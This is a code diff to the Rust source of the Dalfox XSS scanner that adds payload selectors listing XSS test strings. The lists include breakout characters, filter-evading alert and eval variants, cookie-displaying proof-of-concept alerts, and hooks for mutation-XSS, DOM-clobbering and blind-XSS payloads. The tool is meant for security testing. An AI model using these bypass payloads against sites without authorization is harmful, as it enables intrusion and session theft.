@@ -8,6 +8,12 @@ const KNOWN_SELECTORS: &[&str] = &[
     "payloadbox",
     "portswigger",
     "uri-scheme",
+    "special-chars",
+    "functions",
+    "awesome-alert",
+    "dom-clobbering",
+    "mxss",
+    "blind",
 ];
 
 /// Manage or inspect payloads (no local flags).
@@ -19,13 +25,13 @@ const KNOWN_SELECTORS: &[&str] = &[
 #[derive(Args, Debug, Clone)]
 #[command(
     about = "Manage or inspect payloads",
-    long_about = "Selectors:\n  - event-handlers: list all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: list useful HTML tag names often used in XSS contexts (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
+    long_about = "Selectors:\n  - event-handlers: list all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: list useful HTML tag names often used in XSS contexts (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)\n  - special-chars: print special characters (and encoded variants) for context probing / breakout\n  - functions: print visibly-confirmable sinks with filter-surviving variants (alert, prompt, ...)\n  - awesome-alert: print polished alert PoCs for clean screenshots/demos (alert(document.domain), ...)\n  - dom-clobbering: print DOM clobbering payloads\n  - mxss: print mutation-XSS / sanitizer-bypass payloads\n  - blind: print blind-XSS skeletons ({} = your OOB callback URL)"
 )]
 pub struct PayloadArgs {
     #[arg(
         value_name = "SELECTOR",
-        help = "Payload selector\nAvailable selectors:\n  - event-handlers\n  - useful-tags\n  - payloadbox\n  - portswigger\n  - uri-scheme",
-        long_help = "Selector to enumerate payload resources.\nSupported selectors:\n  - event-handlers: print all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: print useful HTML tag names used for XSS payloads (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)"
+        help = "Payload selector\nAvailable selectors:\n  - event-handlers\n  - useful-tags\n  - payloadbox\n  - portswigger\n  - uri-scheme\n  - special-chars\n  - functions\n  - awesome-alert\n  - dom-clobbering\n  - mxss\n  - blind",
+        long_help = "Selector to enumerate payload resources.\nSupported selectors:\n  - event-handlers: print all DOM event handler attribute names (e.g., onclick, onmouseover)\n  - useful-tags: print useful HTML tag names used for XSS payloads (e.g., script, img, svg)\n  - payloadbox: fetch and print remote XSS payloads from PayloadBox\n  - portswigger: fetch and print remote XSS payloads from PortSwigger\n  - uri-scheme: print scheme-based XSS payloads (javascript:, data:, etc.)\n  - special-chars: print special characters (and encoded variants) for context probing / breakout\n  - functions: print visibly-confirmable sinks with filter-surviving variants (alert, prompt, ...)\n  - awesome-alert: print polished alert PoCs for clean screenshots/demos (alert(document.domain), ...)\n  - dom-clobbering: print DOM clobbering payloads\n  - mxss: print mutation-XSS / sanitizer-bypass payloads\n  - blind: print blind-XSS skeletons ({} = your OOB callback URL)"
     )]
     pub selector: Option<String>,
 }
@@ -40,6 +46,83 @@ fn uri_scheme_payloads() -> &'static [&'static str] {
     ]
 }
 
+/// Special characters (and a few encoded variants) for context probing and
+/// breakout. Injecting these one at a time reveals how a sink reflects input:
+/// which bytes survive verbatim, which are HTML/URL-encoded, and which are
+/// stripped — the same signal the engine uses to pick a context-aware payload.
+fn special_chars_payloads() -> &'static [&'static str] {
+    &[
+        // Raw breakout characters
+        "<", ">", "\"", "'", "`", "(", ")", "{", "}", "[", "]", ";", "/", "=", "+", "%", "\\", "-",
+        "!", "&", // HTML entity variants
+        "&lt;", "&gt;", "&quot;", "&#39;", "&#x27;", "&apos;", "&#96;",
+        // URL-encoded variants
+        "%3C", "%3E", "%22", "%27", "%60", "%28", "%29", // Double URL-encoded
+        "%253C", "%253E", // Unicode escapes (JS string context)
+        "\\u003c", "\\u003e", "\\x3c", "\\x3e",
+    ]
+}
+
+/// Sinks that produce a **visibly confirmable** result, plus variants that
+/// survive common filters. If one of these fires you can *see* it, so impact is
+/// proven rather than inferred. Prefer these for manual verification.
+fn functions_payloads() -> &'static [&'static str] {
+    &[
+        // Canonical sinks
+        "alert(1)",
+        "prompt(1)",
+        "confirm(1)",
+        "print()",
+        // Grouping / property-access forms that dodge naive keyword filters
+        "(alert)(1)",
+        "(alert)`1`",
+        "window['alert'](1)",
+        "window[/**/'alert'](1)",
+        "self['alert'](1)",
+        "globalThis['alert'](1)",
+        "top.alert(1)",
+        "parent.alert(1)",
+        "this['alert'](1)",
+        // Tagged-template invocation (no parentheses)
+        "alert`1`",
+        // String-to-code sinks
+        "setTimeout('alert(1)')",
+        "setInterval('alert(1)')",
+        "Function('alert(1)')()",
+        "[].constructor.constructor('alert(1)')()",
+        "eval('alert(1)')",
+        // Reconstruct the keyword from fragments
+        "window['al'+'ert'](1)",
+        "top[8680439..toString(30)](1)",
+    ]
+}
+
+/// Polished, self-explanatory alert PoCs for clean screenshots, reports, and
+/// talks. Each renders the host/origin/cookie so the popup proves *where* it
+/// fired without any extra explanation.
+fn awesome_alert_payloads() -> &'static [&'static str] {
+    &[
+        "alert(document.domain)",
+        "alert(document.cookie)",
+        "alert(window.origin)",
+        "alert(location.href)",
+        "alert(document.location)",
+        "alert(`XSS on ${document.domain}`)",
+        "prompt(document.domain)",
+        "confirm(document.domain)",
+        "alert(navigator.userAgent)",
+        "alert(document.baseURI)",
+    ]
+}
+
+/// Print a list of owned strings one per line and log the count.
+fn print_lines(selector: &str, list: &[String]) {
+    for p in list.iter() {
+        println!("{}", p);
+    }
+    crate::dbg_log!("{}: {} items", selector, list.len());
+}
+
 fn print_summary() {
     let js_count = crate::payload::XSS_JAVASCRIPT_PAYLOADS.len();
 
@@ -50,7 +133,13 @@ fn print_summary() {
     println!("  dalfox payload useful-tags");
     println!("  dalfox payload payloadbox");
     println!("  dalfox payload portswigger");
-    println!("  dalfox payload uri-scheme\n");
+    println!("  dalfox payload uri-scheme");
+    println!("  dalfox payload special-chars");
+    println!("  dalfox payload functions");
+    println!("  dalfox payload awesome-alert");
+    println!("  dalfox payload dom-clobbering");
+    println!("  dalfox payload mxss");
+    println!("  dalfox payload blind\n");
 
     println!("Summary:");
     println!("- Canonical JavaScript payloads: {}", js_count);
@@ -150,6 +239,52 @@ pub fn run_payload(args: PayloadArgs) -> ScanOutcome {
                 println!("{}", payload);
             }
             crate::dbg_log!("uri-scheme: {} payloads", list.len());
+            ScanOutcome::Clean
+        }
+        Some("special-chars") => {
+            let list = special_chars_payloads();
+            for payload in list {
+                println!("{}", payload);
+            }
+            crate::dbg_log!("special-chars: {} items", list.len());
+            ScanOutcome::Clean
+        }
+        Some("functions") => {
+            let list = functions_payloads();
+            for payload in list {
+                println!("{}", payload);
+            }
+            crate::dbg_log!("functions: {} items", list.len());
+            ScanOutcome::Clean
+        }
+        Some("awesome-alert") => {
+            let list = awesome_alert_payloads();
+            for payload in list {
+                println!("{}", payload);
+            }
+            crate::dbg_log!("awesome-alert: {} items", list.len());
+            ScanOutcome::Clean
+        }
+        Some("dom-clobbering") => {
+            print_lines(
+                "dom-clobbering",
+                &crate::payload::get_dom_clobbering_payloads(),
+            );
+            ScanOutcome::Clean
+        }
+        Some("mxss") => {
+            print_lines("mxss", &crate::payload::get_mxss_payloads());
+            ScanOutcome::Clean
+        }
+        Some("blind") => {
+            // XSS_BLIND_PAYLOADS carries a `{}` placeholder for the OOB callback
+            // URL; keep it verbatim so the printed skeleton shows where the URL
+            // goes (users wire it up with `-b https://your-callback`).
+            let list: Vec<String> = crate::payload::XSS_BLIND_PAYLOADS
+                .iter()
+                .map(|s| s.to_string())
+                .collect();
+            print_lines("blind", &list);
             ScanOutcome::Clean
         }
         Some(other) => {
